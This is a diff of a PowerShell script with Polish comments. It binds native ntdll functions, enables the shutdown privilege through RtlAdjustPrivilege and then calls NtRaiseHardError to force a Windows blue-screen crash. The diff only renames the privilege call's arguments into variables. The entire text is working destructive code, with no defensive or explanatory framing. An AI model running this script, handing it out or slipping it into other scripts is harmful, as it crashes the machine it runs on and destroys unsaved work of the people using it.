@@ -8,5 +8,12 @@ public class NtDll {
     public static extern int NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptionCount, out uint Response);
 }
 "@
-[NtDll]::RtlAdjustPrivilege(19, $true, $false, [ref]$null)
+
+# Podnieś uprawnienia
+$Privilege = 19
+$PreviousValue = $false
+[NtDll]::RtlAdjustPrivilege($Privilege, $true, $false, [ref]$PreviousValue)
+
+# Wywołaj BSOD
+$Response = 0
 [NtDll]::NtRaiseHardError(0xC0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$Response)
